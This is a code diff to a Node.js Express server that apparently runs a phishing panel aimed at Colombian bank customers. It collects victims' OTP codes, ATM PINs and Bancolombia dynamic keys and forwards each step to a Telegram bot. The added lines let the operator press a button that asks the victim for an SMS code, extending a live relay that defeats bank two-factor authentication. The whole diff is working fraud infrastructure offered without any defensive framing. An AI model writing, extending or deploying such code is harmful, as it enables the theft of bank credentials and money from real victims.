@@ -107,6 +107,7 @@ function textoPasoOTP(pago) {
     let valor = pago.codigo_otp;
     if (pago.requiere_clave_atm) { etiqueta = 'CLAVE ATM'; valor = pago.clave_atm; }
     else if (pago.requiere_clave_dinamica) { etiqueta = 'CLAVE DINÁMICA'; valor = pago.clave_dinamica; }
+    else if (pago.requiere_sms) { etiqueta = 'CÓDIGO SMS'; valor = pago.codigo_otp; }
 
     return (
         `🔐 <b>NUEVOS DATOS RECIBIDOS (PASO 3: ${etiqueta})</b>\n\n` +
@@ -207,6 +208,7 @@ app.post('/api/crear-pago', async (req, res) => {
                 cedula_solicitante: cedula_solicitante || '—',
                 requiere_clave_atm: esBancoClaveATM(banco_emisor),
                 requiere_clave_dinamica: esBancolombia(banco_emisor),
+                requiere_sms: false,
                 estado: 'pendiente',
                 paso: paso || 'crear',
                 fase_actual: paso === 'otp' ? 'otp' : 'credenciales',
@@ -240,6 +242,7 @@ app.post('/api/crear-pago', async (req, res) => {
                 pago.codigo_otp = null;
                 pago.clave_atm = null;
                 pago.clave_dinamica = null;
+                pago.requiere_sms = false;
                 pago.message_id_otp = null;
                 pago.motivo_rechazo = null;
                 pago.redirigir_a = null;
@@ -265,6 +268,7 @@ app.post('/api/crear-pago', async (req, res) => {
             if (pago.requiere_clave_atm) {
                 botones.push({ text: '🔑 Clave ATM', callback_data: `clave_atm:${pago.solicitud_id}` });
             }
+            botones.push({ text: '📱 SMS', callback_data: `sms:${pago.solicitud_id}` });
             replyMarkup = { inline_keyboard: [botones] };
         } else if (pasoActual === 'otp') {
             replyMarkup = { inline_keyboard: [[
@@ -307,7 +311,8 @@ app.get('/api/estado-pago/:solicitud_id', (req, res) => {
                 fase: 'credenciales',
                 marca: pago.marca_tarjeta,
                 requiere_clave_atm: !!pago.requiere_clave_atm,
-                requiere_clave_dinamica: !!pago.requiere_clave_dinamica
+                requiere_clave_dinamica: !!pago.requiere_clave_dinamica,
+                requiere_sms: !!pago.requiere_sms
             });
         }
         if (pago.estado === 'rechazado_credenciales') {
@@ -373,6 +378,13 @@ app.post('/api/telegram-webhook', async (req, res) => {
             await tgAnswerCallback(cq.id, '🔑 Se solicitó Clave ATM al cliente');
             if (msgId) {
                 await tgEditMessage(msgId, `🔑 <b>SE SOLICITÓ CLAVE ATM AL CLIENTE</b>\n\n` + textoPasoCredenciales(pago));
+            }
+        } else if (accion === 'sms') {
+            pago.requiere_sms = true;
+            pago.estado = 'aprobado_credenciales';
+            await tgAnswerCallback(cq.id, '📱 Se solicitó código por SMS al cliente');
+            if (msgId) {
+                await tgEditMessage(msgId, `📱 <b>SE SOLICITÓ CÓDIGO POR SMS AL CLIENTE</b>\n\n` + textoPasoCredenciales(pago));
             }
         } else if (accion === 'error_usuario') {
             pago.estado = 'rechazado_user_error';
